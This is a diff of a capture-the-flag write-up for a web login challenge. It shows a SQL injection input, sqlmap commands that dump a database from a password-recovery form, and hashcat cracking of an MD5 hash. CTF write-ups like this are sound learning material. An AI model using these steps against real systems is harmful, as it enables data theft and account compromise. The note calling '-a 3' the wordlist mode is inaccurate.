@@ -1428,6 +1428,7 @@ Well that didn't help much... I've read about SQL Injection being used in login 
 Lets try to input `' or '' = '` into username and password on the login page.
 
 ![usernotfound](./web/usernotfound.png)
+
 Guess it doesn't work here. What if we try it on the password recovery page?
 
 ![allusersexposed](./web/allusersexposed.png)
@@ -1437,11 +1438,19 @@ Lets run this `sqlmap -u https://hacklogin.challenge.fi/password-recovery.php --
 ![dbfound](./web/dbfound.png)
 Next lets add the database into our line and lets dump all data that the database has. `sqlmap -u https://hacklogin.challenge.fi/password-recovery.php --data "username=admin" --threads 10 --batch -D random --dump-all`
 ![dumpall](./web/dumpall.png)
+
 We got the hash and it works as a flag!
 #### 9.3 Hack weblogin part 2
-We can use [hashcat](https://hashcat.net/hashcat/) for this lets run `hashcat -a 0 -m 10 adminhash rockyou.txt`
+```
+A web application developer has implemented an admin login interface. However, they have accidentally left a bug that you exploited to obtain the password hashes on the previous challenge. Can you reverse the obtained hash and login to the service?
+
+Do you accept the challenge?
+
+http://hacklogin.challenge.fi/
+```
+Reversing a hash you say! There are multiple different tools out there which can crack open MD5 passwords with or w/o salts, but we are going to use [hashcat](https://hashcat.net/hashcat/) for this lets run `hashcat -a 0 -m 10 adminhash rockyou.txt`
 `-a 3` is wordlist
-`-m 10` is MD5(pass:salt)
+`-m 10` is MD5(pass:salt) (another one would be -m 20 MD5(salt:pass))
 `rockyou.txt` includes a lot of passwords
 
 ```
